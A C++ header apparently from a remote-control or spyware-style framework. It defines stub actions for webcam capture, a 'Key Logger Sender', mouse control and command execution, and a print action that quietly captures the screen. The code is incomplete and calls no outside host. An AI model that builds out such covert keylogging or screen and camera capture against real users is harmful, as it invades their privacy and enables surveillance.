#pragma once
#include <Actions/ActionsDef.h>
// ------------------------------ Actions Implementations ------------------------------ //
// --- Derived Actions ---
class PrintAction final : public Action {
public:
	std::string getName() override {
		return "Print Actions";
	}

	PrintAction() {
		EnableDataIn();
	}

	void execute(const std::function<void(const DataStruct &)> callback) override {
		// Convert to PrintActionRequest
		OperatingSystemManager::CaptureScreen();

		std::cout << "Printing: " << actionData->message << "\n";
		callback({*actionData}); // No output
	}

	void initialize(const json &json) override {
		actionData = std::make_shared<PrintMessage_S>(json.get<PrintMessage_S>());
	}

private:
	std::shared_ptr<PrintMessage_S> actionData;
};

// --- Show image on screen ---
class ShowImageAction final : public Action {
public:
	ShowImageAction() {
		EnableDataIn();
	}

	void execute(const std::function<void(const DataStruct &)> callback) override {
		// Some interface that will work with operating system.
		std::cout << "Showing image: " << actionData->image_path << "\n";
		callback({*actionData});
	};

	std::string getName() override {
		return "Show Image";
	};

	void initialize(const json &json) override {
		actionData = std::make_shared<ShowImage_S>(json.get<ShowImage_S>());
	};

	std::shared_ptr<ShowImage_S> actionData;
};

// --- Set mouse position ---
class SetMousePositionAction final : public Action {
public:
	void execute(std::function<void(const DataStruct &)> callback) override {
		for (const auto &data: *actionsData) {
			OperatingSystemManager::SetMousePosition(data.x, data.y);
		}
		callback({}); // No output
	};

	std::string getName() override {
		return "Set Mouse Position";
	};

	void initialize(const json &json) override {
		actionsData = std::make_shared<std::vector<MousePosition_S> >(json.get<std::vector<MousePosition_S> >());
	};

	std::shared_ptr<std::vector<MousePosition_S> > actionsData;
};

class GetCamera final : public Action {
public:
	std::string getName() override {
		return "Get Camera";
	};

	GetCamera() {
		DisableDataIn();
	}

	void execute(std::function<void(const DataStruct &)> callback) override {
		OperatingSystemManager::GetImageFromCamera();
	};

	void initialize(const json &json) override {
	};
};

// --- Get Keyboard Input ---
class KeyLoggerSender final : public Action {
public:
	std::string getName() override {
		return "Key Logger Sender";
	};

	KeyLoggerSender() {
		DisableDataIn();
	}

	void execute(std::function<void(const DataStruct &)> callback) override {
		OperatingSystemManager os;
		OperatingSystemManager::StartCapturingKeyboard();
	};
};

class RunCommand final : public Action {
public:
	std::string getName() override {
		return "Run Command";
	};


	void execute(std::function<void(const DataStruct &)> callback) override {
		OperatingSystemManager os;
		OperatingSystemManager::RunCMDCommand("echo Hello World");
		callback({});
	};
};

